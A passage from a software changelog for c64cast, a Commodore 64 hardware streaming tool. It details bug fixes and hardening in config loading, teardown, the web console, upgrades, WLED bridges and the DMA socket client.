  declared and vision off, the camera stayed shut, and the pad's scene build
  failed on a background thread — logged, then swallowed into the pad's error
  state, so the pad simply never fired for the whole show. Clips now count
  toward opening the camera.
- **A bad `[wled].listen` took the whole run down after the hardware was
  already up.** The endpoint was parsed at service-start time, outside the
  guard that is supposed to keep one optional surface from killing a session,
  so `listen = ":70000"` produced a traceback and an unmapped exit code with
  every machine already open, reset and provisioned. It is now rejected by
  `--doctor`-grade config validation *before* any hardware is touched (exit
  `5`, like every other config error), and a failure at bind time disables the
  WLED device and leaves the show running. The same change closes a validator
  gap: `[wled]` was checked by `--doctor` and by nothing else.
- **A partly-torn-down system could be left holding hardware.** A failure part
  way through building one system's stack unwound by hand, in four different
  places, with no per-step guard — so a failing sampler restore stranded the
  API socket and the camera, and a failure anywhere after the REU provisioning
  step (an audio-streamer or preview construction failure) unwound nothing at
  all. Every resource is now registered on one ladder as it is acquired and
  released in reverse, each step guarded, whatever the failure.
- **Teardown could run underneath live playlist threads.** `teardown_session`
  documented itself as safe to call from a `finally:` but never stopped the
  playlists, so any escape that skipped the drain — a thread that failed to
  start, an unexpected exception out of the run loop — closed audio, reset and
  closed the API while a worker was still writing to the machine, which is the
  mid-DMA cut that can wedge it into needing a power cycle. It now sets the
  stop flag and drains the threads first (a no-op on the normal path), and the
  thread list is populated as each thread starts so a partial failure is still
  visible to teardown.
- **The framebuffer kept shadowing every DMA write for a disabled feature.**
  With `[preview]` off and `[recording]` on, a recorder that refused to start
  (a codec/fourcc the platform will not open) left the shadow-memory write
  listener registered for the rest of the run with nothing reading it. It is
  now detached when no consumer survives, and at teardown.
- **`--profile` re-printed every scene the run had ever played.** The periodic
  summary iterated every scene it had ever seen, so a 10-scene looping
  playlist printed 10 lines every interval, 9 of them the last 64 frames of
  scenes that had ended minutes earlier, with nothing in the line marking them
  stale — and the table grew without bound on a playlist whose scene names
  come from the media (a directory scene renames itself per file; a video
  scene prefers the file's own title tag). Only scenes that have rendered
  since their last line are printed now, and an idle scene's samples are
  dropped. Two smaller fixes in the same summary: the scene name is escaped
  and length-capped, so a newline inside a played file's title tag can no
  longer forge an extra record in `--log-file`; and a stage the summary
  doesn't recognize is printed after the known columns rather than measured
  and silently discarded.
- **`--profile`'s p50 was one sample too high.** The percentile index
  truncated where nearest rank rounds up, so at the steady-state 64-sample
  window the reported median was the 33rd smallest frame time rather than the
  32nd (and the "median" of two samples was the larger one). p95 was affected
  at some window sizes too.
- `--profile --profile-interval 0` instruments every frame and prints nothing;
  it now says so once at startup instead of looking like a broken profiler.
- A second SIGINT/SIGTERM escalates to the default disposition per signal, as
  documented. One shared flag meant the first SIGTERM after a Ctrl+C took the
  escalation branch — arming the hard kill a signal earlier than promised, and
  dropping that SIGTERM's own stop request.

- **`--serve` reported success for a run that never served.** uvicorn binds
  on its background thread, not in `ControlServer.start()`, and when the port
  is already in use — a second `--serve` on the same host, the likeliest
  operator error — it calls `sys.exit(1)` *there*: a `SystemExit` that the
  poll thread does not catch and that Python's thread hook discards without a
  record. So the host logged "listening on http://…", printed a login URL,
  autostarted a show on real hardware, parked forever with nothing listening,
  and exited `0` on the eventual Ctrl+C. `start()` now waits for uvicorn to
  confirm the bind before it claims to be listening and answers whether it
  is; `--serve` exits `2` with the reason named, and never advertises,
  banners or autostarts a console that isn't there. (This also reaches the
  WLED device server and the `[control]` plane, which get the error line
  instead of a false claim.)
- **The web console's state feed died under its own log volume.** The
  supervisor's log buffer was read by the push loop with no lock while
  build and teardown workers appended to it, and iterating a `deque` that is
  being appended to — or, at its size cap, evicted from — raises
  `RuntimeError: deque mutated during iteration`. The reader's caller
  handled that as a closed socket at debug level, so the browser's only
  channel for session state and log lines dropped and reconnected exactly
  when the log was busiest: a failing build, which is what the buffer exists
  for. Both readers now snapshot under the handler's own lock.
- **The host stopped its listener before its session, the reverse of the
  documented order.** On a shutdown signal the mDNS record and the HTTP
  server went down first and the session was torn down only after the loop
  returned — so every connected console lost its socket and *then* waited out
  up to a minute of hardware teardown it could no longer watch, which is
  precisely the failure the docstring and the architecture note both said was
  avoided. The session now comes down first on the shutdown path (the
  restart path still replaces only the listener), and a test pins the order
  rather than leaving it to prose.
- **A stop pressed during a show switch was discarded, and the switch
  started the new show anyway.** `stop()` consulted only the supervisor's
  state, so for the whole duration of a `switch` an operator's stop was
  refused as "not running" during the teardown and dropped in the idle gap
  before the replacement was claimed — answered `202` by the route either
  way. A stop landing anywhere inside a switch now cancels the pending
  start.
- Shutting the host down during a switch left a brand-new session holding the
  machine. `close()` woke the parked switch worker on the very transition it
  was waiting for, the worker claimed a new generation, and the join then
  waited for that build to *finish* — so a Ctrl+C during a console switch
  returned with a session running, the run marker written and the hardware
  held, straight into the force-exit backstop. `close()` is now terminal (a
  start or switch afterward is refused, an in-flight switch bails) and
  re-asserts idle after its join, so a start that squeezed through is still
  torn down.
- An abandoned switch was invisible to the console. When the previous session
  would not come down inside the timeout, the supervisor logged to the host's
  stderr and returned — no `last_error`, no transition — so a browser holding
  the `202` and the generation it had been promised saw nothing change at
  all, with `last_error: null`. Every way a switch can be abandoned now
  parks the reason in `last_error` and re-notifies the feed, and a teardown
  that *raised* does the same instead of settling as a clean `idle`.
- A start worker that could not be spawned wedged the host permanently in
  `starting`: nothing else leaves that state, so `start`/`switch` refused
  forever and a stop only armed a flag. The failed spawn now rolls the
  generation back, lands in `error` (which is startable) and still raises.
- `--reset-setup` prints what it did in both cases and always leaves the
  reopen marker, so it works on a host that had already lost `setup.json`.
- Smaller supervisor fixes: the log buffer's `tail(limit=0)` returned the
  entire retained tail rather than nothing (`rows[-0:]` is the whole list);
  the reap path and an operator stop spawned worker threads with identical
  names, so a straggler logged by name could not be attributed to either; the
  60-second teardown-wait line was logged on every exit path including the
  ones where no session ever existed; and a length mismatch between configs
  and system names in the after-a-crash safe-state reset dropped a machine
  with nothing logged.
- **The ensemble master silently discarded six of its own sections.**
  `load_master` applied the master TOML through a hand-written tuple of
  `(section, dataclass)` pairs instead of the shared apply loop, and the two
  had drifted: `[hardware]`, `[teensyrom]`, `[vision]`, `[dsp]`,
  `[audio_features]` and `[wled]` never reached `_apply_section` at all, so
  they produced neither an applied value nor an unknown-key record — no
  warning, no `--doctor` row, nothing. `[hardware]` and `[teensyrom]` are
  *listed as cascading*, so the cascade dutifully ran over a
  `defaults.hardware` nothing had populated: a master `[hardware] backend =
  "teensyrom"` read as nothing while every system in the wall quietly dialed
  the default Ultimate URL. The tuple also ran 3 of the 10 load-time
  validators, so a master `[ultimate64].sid_panning = [99]` was copied into
  every system and failed mid-show when the mixer was configured — exactly
  what that validator's docstring says it exists to prevent. The master now
  goes through `_apply_toml_sections` like any other file, so it inherits
  every validator, the unknown-key hints and the `[color]` handling.
  `[hardware]`, `[teensyrom]`, `[dsp]`, `[audio_features]`, `[vision]` and
  `[wled]` cascade from a master for the first time.
- A section's cascade behavior is now spelled out in exactly one place. The
  cascading list and a not-cascading list (each entry with its reason)
  together classify every scalar section plus `[color]` exactly once, and a
  test asserts the partition *and* that every section listed as cascading
  really does receive a master value — the check that would have caught the
  drift above. A master section that reaches nothing (today `[video]` alone)
  is now called out with a warning instead of being dropped in silence.
- The master cascade shared mutable values by reference: `hue_corrections`,
  `performance.clips`, `host_sid_chips` and `sid_panning`/`sid_volume` were
  handed to every inheriting system as the *same* list or dict object as the
  master's and each other's, so one system mutating one in place would have
  mutated every system's, invisibly at the config layer. They are deep-copied
  now.
- `C64CAST_CONTROL_TOKEN` and `C64CAST_CONTROL_VIEWER_TOKEN` were dead in
  ensemble mode. The plane that binds reads the master's `[control]`, an
  object no `merge_cli` call ever touches, so the env fold landed on N
  per-system configs nothing reads while the plane came up on whatever token
  the shared master file declared — the opposite of what the field's own help
  promises. An operator who rotated the real token into the environment was
  running on the placeholder anyone with repo access had already read.
- An exported-but-empty `C64CAST_CONTROL_TOKEN` /
  `C64CAST_CONTROL_VIEWER_TOKEN` / `C64CAST_DMA_PASSWORD` blanked a
  configured value. `VAR=$UNSET_OTHER` in a service unit or `docker -e VAR`
  exports a string, not nothing, so the fold overwrote the token the config
  had legitimately set. Empty now counts as unset; to run with no token,
  leave the field empty and the variable unset.
- `[color].hue_corrections` concatenated across layers instead of overriding.
  Machine settings declaring band X plus a project TOML declaring band Y gave
  `[X, Y]`, with no way for the project file to replace, reorder or remove X —
  against the documented precedence, and against `scene_color`, which has
  always treated the same field as an all-or-nothing replace. It also made the
  `load(dumps(cfg)) == cfg` round trip lossy (a list-of-tables is written whole
  or not at all, so `[X, Y]` reloaded as `[X, X, Y]`). A layer that declares
  the key now replaces the list; one that stays silent inherits it.
  `hue_corrections_replace_defaults` keeps its own separate meaning against the
  built-in purple rescue.
- A CLI flag or an env var wrote past every load-time validator. All ten fired
  at parse time, one layer *below* the last layer that writes, so `--system
  nonsense` or a blank `--audio-device` reached the run unchecked and failed
  mid-show. `merge_cli` re-runs the battery on the final config.
- `choices` metadata is enforced generically for the scalar config sections,
  rather than by a hand-written validator per field. The fields nobody had
  written one for failed *open*, and `[ultimate64].sid_video_mode` failed open
  into a machine retiming plus an HDMI output-mode switch (it is read as
  `!= "off"`), while `[hardware].host_sid_model`, `[teensyrom].storage` and
  `[ultimate64].hdmi_scan_resolution` silently did nothing. Two documented
  exemptions stay: `sid_play_rate` also takes a rate in Hz, and
  `[ultimate64].system` is matched case-insensitively because the hardware
  layer normalizes its case.
- `resolve_recording_path` measured "the user named this file" against the
  dataclass default rather than the machine-overlaid baseline every other
  layering decision uses — so a `settings.toml` carrying `[recording].path`
  made every system in an ensemble look explicit, skip the per-system stem,
  and point N `cv2.VideoWriter`s at one file. That is the collision the
  never-cascade entry exists to prevent, reached through the one layer that is
  supposed to count as unset, and only `--doctor` caught it.
- `[midi_control].cc_map_is_default` was settable from any TOML layer. It is
  derived run state — set False only when a layer really authored a `cc_map` —
  and writing it directly inverted the controller-profile merge with no
  `cc_map` in sight, because the `internal` metadata hides a field from
  `--describe`/the schema/the serializer but never gated the apply path. Fields
  marked internal are now treated like unknown keys.
- `[ultimate64].sid_panning = 0` and `sid_volume = 0` passed validation and
  then silently auto-spread. Both validators opened with a truthiness guard
  meant for the empty list, which also swallowed a falsy *scalar* — and 0 is a
  meaningful value in both vocabularies (Center, and 0 dB), so a user asking
  for centered got `[-3, +3]`, the opposite. The scalar `-3` spelling of the
  same mistake was correctly rejected all along. `[hardware].host_sid_chips`
  had the same guard.
- Two `[[performance.clips]]` entries could claim one pad. The loader checked
  `slot` uniqueness but only range-checked `pad`, and
  `midi_control._add_clip_pad_mappings` skips a `(kind, number)` it has already
  bound — so the second clip was simply unfirable, with no message. A repeat is
  now refused, naming both slots. (A collision *across* systems at that call
  site stays deliberate.)
- A misspelled config *table* vanished without a diagnostic. Unknown *keys*
  were only ever found inside tables the loader applies, so `[hardwear]` or
  `[ultimate65]` produced nothing at all; a whole unrecognized table is now
  collected like a stray key, with a "did you mean" of its own, and `--doctor`
  renders it as a table rather than a key.
- An all-generative playlist with `audio_source = "sid"` never got the
  ensemble audio-contention warning. `_scene_contends_for_audio` claims to
  mirror `Scene.competes_for_audio_lock()` and omitted `generative`, whose
  SID arm builds a source with `wants_audio_lock = True` — so the exact
  footgun that warning exists for shipped silently: the system idled whenever
  another held the slot and the user was told nothing. The mirror is pinned by
  a test now.
- `machine_baseline()` logged stray machine-settings keys inline instead of
  collecting them, so under `--doctor` one stray key produced both a bare
  warning above the formatted report — the presentation the collect-then-present
  split exists to avoid — and a report row, with the dedupe unable to help
  because the escaping record never entered the list.
- The machine-settings INFO line and its banned-table warning fired N+2 times
  on an N-system ensemble (once per system, plus the master defaults and the
  cascade baseline) — the same repetition the unknown-key dedupe exists to
  collapse. Both are now logged once per file state, and the INFO line names
  the tables the layer supplied instead of only a field count, because "(4
  fields)" cannot tell an operator that this is the layer which turned a
  network switch on.
- **`--upgrade` could kill an install partway through and leave a broken
  one.** Every install command ran under a 120-second ceiling, and
  `subprocess.run` SIGKILLs the child when that expires — so a `uv sync
  --all-extras` or `pip install --upgrade c64cast` resolving a release that
  moved an `opencv-python`/PyAV/numpy pin (≈100 MB to download, or a source
  build on a Pi-class host with no matching wheel) was killed while
  replacing `site-packages`, by the one command whose purpose is repairing
  an install, with no flag or variable to raise the limit. The ceiling is
  now an hour and `$C64CAST_UPGRADE_TIMEOUT_S` overrides it (`0` removes it
  entirely); a command that does hit it is sent SIGINT first — the signal
  uv/pip/pipx/git already unwind cleanly from — and killed only if it
  ignores that; and the message says the upgrade may be only partly applied
  and names the variable. The read-only `git status` probe keeps its own
  short timeout, since it mutates nothing.
- `--upgrade` on a source tree with no `.git` — an unpacked release archive,
  which carries the `pyproject.toml` the checkout verdict is read from — now
  says so, instead of reporting "could not be checked (is git on PATH?)" and
  "Commit or stash first" and sending the user off to fix a `PATH` that was
  never the problem in a directory holding no repository. The checkout
  branch also refuses up front when `uv` is missing rather than discovering
  it after `git pull` has already moved the source, which used to leave the
  tree on new code with the old dependency set; and an unverifiable tree now
  gets its own wording rather than borrowing the dirty tree's advice.
- `--check-for-updates` and `--doctor` could traceback instead of reporting
  "couldn't check". `upgrade.latest_release` is documented "never raises",
  but a PyPI body decoding to a list, a string, a number, `null`, or
  `{"info": null}` raised `TypeError` from its subscript chain, and its lazy
  `import requests` sat outside the guard, so a half-installed `requests` —
  the state an upgrade exists to fix — raised `ImportError` through it. A
  mis-shaped body could also produce a *fabricated* answer that nothing
  downstream could catch: `str()` turned `{"info": {"version": 5}}` into the
  release `"5"`, which compares newer than everything this project has
  published, and `{"info": {"version": null}}` into `"None"`, which cleared
  the recorded `unanswered_since` and discarded the previous real answer.
  The failure is now caught broadly and logged at debug, so `-vv`
  distinguishes a DNS failure from a proxy's 403 from a shape change instead
  of collapsing all of them into the same silent `None`.
- `--check-for-updates --write-state` tracebacked, and threw away the
  network answer it already held, when the data root could not be written —
  read-only (`$C64CAST_DATA_DIR` into a squashfs), full, or with a directory
  planted where `update_check.json` belongs, which `os.replace` cannot
  rename over. `record_check` now warns and carries on, so the answer still
  prints and `c64cast-update-check.service` still exits within the
  `SuccessExitStatus` it enumerates. A non-UTF-8 `update_check.json` also
  raised `UnicodeDecodeError` out of `read_update_state` (guarded by `except
  OSError`, and a decode error is a `ValueError`) into both readers,
  including the script that runs at every SSH login — and because
  `record_check` reads before it writes, the run that would have replaced
  the bad file died first and the slot could never repair itself.
- `--upgrade` reported a `uv/tools`-shaped install for a hand-made pip venv
  that merely sat under a directory called `tools` beside one called `uv`
  (likewise `pipx`/`venvs`), and printed the wrong installer's command:
  those segments are now matched as adjacent path components, which is what
  the documentation always said. `--upgrade` also launches the binary
  `shutil.which` resolved rather than handing the unqualified name back to
  `exec` to re-resolve `PATH`, and the login MOTD's staleness line says no
  update check has *succeeded* in over 30 days rather than blaming PyPI for
  not answering — on a machine with no timer the last attempt did answer and
  nobody has asked since, so the old wording sent an admin hunting a network
  fault that did not exist.

### Changed

- `AudioStreamer.stats()` renames `late_worst_s` to `late_worst_window_s` and
  adds `running`. Every other counter in that snapshot is cumulative for the
  run, while this one is cleared on each health log line, so the key now says
  which it is. (Public only to the Python API, which carries no stability
  promise at `0.x`; nothing in the CLI or config surface changes.)

- `MachineSettingsIsolation` (test helper) now redirects `$C64CAST_DATA_DIR`
  alongside `$C64CAST_SETTINGS`, so a test module that opts into it cannot read
  or write the real `~/.local/share/c64cast/` either. Its name always read
  broader than it was.

- `--doctor` now states when several ensemble systems authenticate with one
  shared `[ultimate64].dma_password`, naming the systems it reached. Unlike
  `url`, `dma_password` cascades from the master, which is deliberate — the
  alternative copies the same secret into every per-system file, and the master
  is the one place the serializer already refuses to write it — but it is
  invisible from any single config file, so an operator reading only a
  per-system TOML could not see where the password came from. Reported at `ok`
  level, grouped by value so two systems that each named their own different
  password are not described as sharing one, and never quoting the password.
- Whether the appliance setup form may write a replacement admin token is now
  read off the credential resolution's own answer for *where* the running
  token came from, instead of being re-derived from the same environment and
  config reads a few lines away. The two expressions agreed, but a drift in
  either direction is a security failure — a form-written token silently
  outranked (locking the admin out at the next restart) or a deliberately
  configured one overwritten — and one of them was untested. The startup
  banner now also names which file or variable the running token came from,
  which is the only signal an operator gets that a pre-planted token file is
  being adopted.
- `--serve`'s body is a loop around one build-and-pump cycle rather than a
  single ~140-line function that also installed signal handlers, resolved
  credentials, decided whether to open the setup window, printed three
  banners, autostarted and owned the shutdown ordering. No behavior change
  beyond the fixes above; each of those decisions is now separately testable,
  which is what the setup-window and shutdown-order regressions needed.
- Config field metadata corrections, all of which render into `--describe`, the
  committed JSON Schema, the annotated example TOML and the web console:
  `applies_to` now means scene types and nothing else (three `[color]` flicker
  fields were passing *display-mode* names and two `[ultimate64]` fields a
  *backend* name through the same key, which the first generic consumer would
  have read as "matches no scene type"; those five say it in their help
  instead, and a test pins the vocabulary); `[[scenes]].overlays` declares the
  types that accept one, so `--describe scene:launcher`, the wizard and the
  console stop offering a key the loader hard-rejects;
  `[midi_control].cc_map`'s help builds its `action` list from the constant
  the loader validates against, having fallen four actions behind it
  (`tempo_tap`, `clip_launch`, `fx_toggle`, `osd.position`);
  `[audio].sampler_sample_rate`'s help pointed at a 6.25 MHz reference clock
  the code no longer divides by, contradicting its own sibling field and the
  shipped default; `[[performance.clips]]`' help states the five defaults that
  previously existed only inside the validator (`quantize` defaults to the
  bar, not to the `"off"` its help listed first); `[web].viewer_token`'s help
  says what the read-only tier can actually see; three more C64-color fields
  declare the `c64color` vocabulary so the console offers swatches instead of
  a blind text box; and two comments pointing at `config.resolve_*` resolvers
  that live in `scene_factory` are requalified.

- A command frame could be silently dropped from either console WebSocket.
  Both push loops wrapped `receive_json()` in `asyncio.wait_for`, which
  *cancels* the receive every 0.35 s — and a frame delivered in the same
  event-loop turn as the timeout is popped off the queue and then thrown
  `CancelledError`, so it was consumed and never acted on, with `except
  TimeoutError: continue` making the loss invisible. A pad tap or a
  `{"session": "stop"}` on a host that owns live hardware simply did
  nothing. The receive is now a long-lived task that survives a timeout.
- One stray WebSocket frame tore down the console's only state feed: a text
  frame that is not JSON raises `JSONDecodeError` and a *binary* frame
  raises `KeyError`, neither of which is a disconnect, so both fell through
  to a blanket `except Exception: log.debug(...)` — the socket closed and
  the browser reconnected into the same failure, with nothing in the log at
  default verbosity. Unparseable frames are now ignored and the loop
  survives; an abrupt transport close stays at debug and everything else is
  logged at `exception`, since a socket nobody asked to close is not a debug
  detail.
- An `OSError` from any of the appliance setup form's three writes escaped as
  a bare `500` with no body, to an admin whose only interface to the box
  *is* that form. It now answers with the path that could not be written and
  the OS's own reason, and says that setup is still pending so a retry can
  recover. The token is also written *after* the connection now: it used to
  go first, so a failure writing `settings.toml` left the host's credential
  already replaced by one the `500` never handed back.
- `register_web_routes`' `library`/`media` parameters defaulted to `None` and
  constructed real stores on demand, which resolve into the data directory
  and write there — a caller who forgot one got a component quietly writing
  under `~/.local/share/c64cast` instead of a `TypeError`. Both are now
  required, built once where `run_daemon` builds the config store.
- `web_static.landing_path` ignored the `directory` override its four
  siblings honor, so a host serving the console from a non-packaged bundle
  computed `/perf` for the startup URL, the read-only link and the setup
  form's login link. Latent (production never passes one), but it made
  `landing_path` the one function there whose answer could not agree with
  what was mounted.
- `TokenAuthMiddleware` now unions `PUBLIC_PATHS` into `public_paths` itself
  rather than trusting each caller to, which is what `install_auth`'s
  docstring already promised; the introspection cache is built under a lock,
  so the "built once" comment above it is true even when two cold requests
  arrive together; and an empty `Authorization: Bearer` header (what some
  proxies emit for an unset credential) falls through to the next token
  source instead of suppressing a valid cookie and answering `401`.

- `-u`/`--url`/`$C64CAST_URL` accepted a `user:pass@` netloc (`u64://admin:s3cret@host`)
  and carried it verbatim into `[ultimate64].url` — from which `requests`
  sent it as an HTTP Basic-auth header on every REST call to a device that
  has no HTTP auth of its own, and `--save-settings` both wrote it into
  `settings.toml` and echoed it to stdout in plaintext, directly undercutting
  this project's "the DMA password is env/config-only, never a CLI flag"
  posture for anyone who assumed the URL was where a credential went.
  `connect.parse_connection_uri` now refuses any target carrying userinfo, on
  every scheme, naming `C64CAST_DMA_PASSWORD`/`[ultimate64].dma_password` as
  the place a secret actually belongs. Related connect.py hardening in the
  same pass: the `http(s)://` branch passed the whole target (including its
  `?query` string) through as the base URL while *also* consuming
  `dma_port` out of that same query, so `-u 'http://host?dma_port=64'` left
  `?dma_port=64` inside the string `Ultimate64API` concatenates every REST
  path onto — it now rebuilds the URL from its parts like the `u64://`
  branch already did. A netloc port is now validated the same way on every
  scheme (`u64://host:badport` and `http://host:badport` used to parse
  cleanly into a URL `requests` would only reject deep in the startup probe,
  misdiagnosing as "could not reach the hardware"); `tr://host:2113?tcp_port=x`
  used to skip validating the query param entirely because `port or
  _int_query(...)` only reached the query when the netloc had no port of its
  own (the same typo raised on `tr://host?tcp_port=x` but was silently
  ignored on `tr://host:2113?tcp_port=x`); and an unrecognized or blank
  `?query` key (`?dmaport=64`, `?dma_port=`) is now rejected instead of
  silently parsed as absent, matching the strictness a TOML config already
  gets.
- `--save-settings` could raise `ConnectionURIError` (a `ValueError`) straight
  out of `cli.main()` as an uncaught traceback on a bad `-u` target, instead
  of the exit-2 usage error `connect.py`'s own docstring promises — it is
  dispatched before `_resolve_configs`' try/except, and had no guard of its
  own. All of `main()`'s config-free terminal commands (`--save-settings`,
  `--install-char-rom`, `--check-for-updates`, `--upgrade`, `--motd-line`,
  `--reset-setup`) are now dispatched through one table wrapped in the same
  `ValueError`/`RuntimeError` → exit 2 mapping `_resolve_configs` already
  had, so a new command can't forget it. Separately, if an existing
  `settings.toml` already carries a hand-written `[ultimate64].dma_password`,
  `--save-settings` can never re-write it (secrets are suppressed on save) —
  which used to mean the very next `--save-settings` silently dropped it on
  the merge; it now warns at save time instead. `--save-settings --help`
  also stopped listing `-D/--audio-device`, which it has always persisted;
  the whitelist that drives the help text, the "nothing to save" error, and
  the apply block is now one table (`cli_commands.SAVABLE_SETTINGS_FIELDS`)
  instead of three hand-copied lists that could (and did) drift.
- `--calibrate-dac` opened the backend before the try/finally that closes
  it, so `hw_provision.resolve_system` — which talks to the machine to
  settle `system = "auto"` — raising on an unreachable/unresponsive C64
  abandoned the backend's persistent DMA socket; the U64 DMA service is
  single-connection and blocks new sockets for seconds after an unclean
  close, so the operator's very next attempt failed too, looking like an
  unrelated problem. The resolve call now runs inside the same try/finally
  that already closes the backend.
- `--dump-char-rom`'s teardown swallowed a reset failure entirely
  (`contextlib.suppress(Exception)`) even though the reset exists so the
  machine "isn't left parked wherever the dump stub ran" — the one outcome
  worth knowing was exactly what got hidden, at every verbosity, while the
  success message still printed. It now logs a warning naming the failure
  instead. `be.close()` in the same `finally` was unprotected, so a close
  failure on the unresponsive-machine path (the case most likely to hit one)
  replaced the deliberate `return 3`/`return 4` with a traceback; it is now
  guarded the same way.
- `--doctor` rebuilt its merged `LoadResult` field-by-field, which silently
  dropped `master_web` (added after this code was written) instead of
  carrying it forward — latent today (nothing in `doctor.py` reads it yet)
  but one new web-related check away from validating the wrong object on
  every ensemble config. Now built with `dataclasses.replace(loaded,
  cfgs=cfgs)`, so a future `LoadResult` field can't be forgotten the same way.
- A config-resolution failure (`_resolve_configs`, covering `load_master`,
  `merge_cli`, `quickcast.build_config` and `connect.parse_connection_uri`)
  logged only `str(e)` with no traceback, even under `-v`/`-vv` — a genuine
  internal defect anywhere in that tree was indistinguishable from a user
  typo and left oncall to bisect by hand. A `log.debug(..., exc_info=True)`
  now runs right before the existing `log.error`, so `-v` recovers the
  traceback; the exception types caught there are unchanged (still broad
  `ValueError`/`RuntimeError`, since legitimate config validation throughout
  `config.py` also raises plain `ValueError` and narrowing the catch would
  misclassify those as unhandled). The connection target resolved on the
  config-driven run path is now also logged at INFO with its source
  (`-u/--url` or `$C64CAST_URL`), so an env-var override can no longer
  silently repoint a run whose operator is reading a TOML that names a
  different host.
- The WLED sink (`wled_sink.py`, bridge Mode 2) rejected the wrong DDP flag as
  a "query" (`0x08` is STORAGE; QUERY is `0x02`), so a real discovery probe
  from LedFx/xLights/Jinx! slipped through as if it were pixel data and a
  STORAGE-flagged pixel packet was silently dropped. A TIME-flagged DDP packet
  (a 4-byte timecode ahead of the pixel payload) was also misparsed — the
  payload slice started 4 bytes early instead of accounting for the longer
  header. Both are now decoded per the DDP flag layout.
- The WLED sink no longer leaks its two UDP sockets when `start()` is called
  again after the receive thread has died with the sockets still open — the
  old sockets are closed first, and a stale `bind_error` from a prior failed
  start no longer survives into a later successful one.
- The WLED sink no longer re-copies the whole frame buffer on every single
  incoming datagram — publishing is now rate-limited to a real display frame
  budget (1/60s), closing off a minimal-datagram flood as a way to peg a
  core in memcpy. New `[[scenes]]` fields for `type = "wled"`: `sink_allow`
  restricts accepted senders to an IP allowlist (neither wire protocol
  authenticates, so this is the only barrier against another LAN host
  injecting frames into the broadcast), and `sink_ddp_port` / `sink_wled_port`
  move the sink off its two standard ports if something else on the host
  already owns one. The receiver also now logs the first accepted datagram's
  source, and the first datagram a parser rejects, so a silent "nothing on
  screen" is attributable.
- The virtual WLED device (`wled_device.py`, bridge Mode 1) accepted a state
  change POSTed from any origin — a page the operator merely had open in a
  browser tab could pause the show, black the screen, or delete presets, with
  no CORS preflight to stop it. `POST /json` and `/json/state` now reject a
  request whose `Origin` header names a different host than its own; a
  same-origin fetch from the served `/` page or a non-browser client
  (python-wled, Home Assistant) is unaffected. Separately, a client posting a
  preset id past 250 used to silently no-op instead of landing on a free
  slot, and omitting `psave` on a full store silently overwrote preset 250 —
  both now go through the same free-slot search, which reports the store as
  full (rather than picking a stale id) once every slot is taken.
- The virtual WLED device's served `/` control page stopped re-rendering
  after touching almost any control — a slider drag, the color picker, the
  power switch, or saving a preset — because those all keep keyboard focus
  past the interaction, and `render()` skips its rebuild while any input is
  focused (so it won't yank a control mid-drag). Each now blurs once its own
  interaction actually ends, matching what the scene dropdown already did.
- `WledBridge`'s pseudo-MAC now passes `usedforsecurity=False` to
  `hashlib.md5`, so constructing it no longer hard-fails on a FIPS-enforcing
  OpenSSL build (the hash is a cosmetic 12-hex-digit identifier, not a
  security primitive).
- The WLED audio-sync broadcaster (`wled_sync.py`, bridge Mode 3) could raise
  an unhandled `AttributeError` out of its emit thread if `stop()` ran between
  a tick's null-check and its `sendto` call; `_emit` now binds the socket to a
  local first. Its running failed-send count is now readable (`send_errors`)
  and `stop()` logs it as a one-line summary when nonzero.
- The Ultimate 64's own VIC output stream (`vic_stream.py`) accepted a UDP
  datagram from any sender, not just the machine it asked to stream — a
  spoofed or garbled flood could inject fake frames or grow the partial-frame
  reassembly buffer without bound (it only shrank on a silence timeout, never
  on a byte cap). The receiver now checks the packet's source address and
  caps the reassembly buffer independent of that timeout. `start()` also
  leaked its socket if the streaming request failed with a `SocketDMAError`
  rather than a bare `OSError`; both are now caught. `stats` now reads its
  counters under the receiver's lock.
- `Ultimate64API` (`api.py`): a PSID with `load_addr=0` and a `data_offset`
  leaving fewer than 2 payload bytes raised a bare `IndexError` instead of a
  clear `ValueError` while decoding the inline load-address header.
  `cue_song_reinit(song)` with `song` out of `1..num_songs` range (a bad
  caller index, or a stale UI control after switching tunes) reached
  `ParsedPsid.song_is_vsync`'s `speed >> bit` with a negative `bit` and
  raised `ValueError: negative shift count` instead of a message naming the
  actual problem; both now validate up front. `launch_program`,
  `run_sid_player`, and `dump_char_rom` flushed pending DMA writes and, on a
  failed flush, logged a warning but proceeded anyway into an irreversible
  `run_prg` reset that could race ahead of writes it depends on (the SID
  payload, the re-INIT stub, ...) — those three now abort with a
  `RuntimeError` instead. The three also shared one helper for the
  duplicated POST-then-404-to-`RuntimeError` pattern. `self.timeout`, set in
  `__init__` and never read (every call site takes its own `timeout`
  parameter), is removed. `urllib.parse.quote`, imported locally in two
  methods, is now a module-level import alongside the existing `urlparse`
  one.
- `SocketDMAClient` (`socket_dma.py`): `flush()` re-raised a failed IDENTIFY
  round-trip (including a `TimeoutError`, an `OSError` subclass) without
  closing the socket, so the *next* command read that reply's stale length
  byte and payload as its own — permanently one reply behind on the sync
  barrier every REST runner call (`run_prg`/reset) depends on. Both
  handshake steps (`_authenticate_locked`, `_identify_locked`) sent their
  command before entering the try block that maps failures to
  `SocketDMAError`, so a peer that reset the connection mid-handshake let a
  raw `OSError` escape past `connect()`'s documented contract, skipping
  callers' cleanup (`session._open_backend`'s camera release,
  `doctor._probe_connectivity`'s "one dead system doesn't hide the others").
  `_recv_exact_locked` restarted its 2s socket timeout on every chunk
  instead of tracking one cumulative deadline, so a peer that dribbled a
  reply back one byte at a time could wedge the read (and the lock this
  client shares with `AudioStreamer`) far longer than `io_timeout`. A
  command payload over 65535 bytes raised a bare `struct.error` instead of
  `SocketDMAError`, escaping both the reconnect handling and the caller's
  documented error contract. `keyb()`'s docstring claimed the firmware
  clamps to the 10-byte kernal buffer; it doesn't (verified against
  socket_dma.cc) — a longer write reaches past $0277 into $0291 and beyond,
  so the bound is now enforced client-side. `vicstream_on`'s watchdog
  encoding rounded any `stop_after_s` under 2.5ms — and any negative
  value — onto the sentinel its own docstring defines as *unbounded*, the
  exact inverse of the request; sub-tick durations now round up to one
  tick and a negative duration raises. A rejected password kept being
  re-dialed and re-offered in cleartext on every subsequent write with no
  backoff; it's now sticky until an explicit `connect()`, and `close()` is
  now similarly terminal (a write after it raises instead of silently
  reopening a connection nobody owns). The retried command in
  `_send_with_reconnect` left the socket assigned when it also failed,
  risking a misframed next command; both that path and the transient-
  retry's own log line (previously an unconditional `WARNING`, duplicating
  what `backend.py`'s escalating failure ladder already reports on a
  sustained outage) are fixed. `latency_summary()`'s percentile index was
  one rank high for small windows (p95 printed identical to max at n=20).
  The device-supplied IDENTIFY string is now filtered to printable
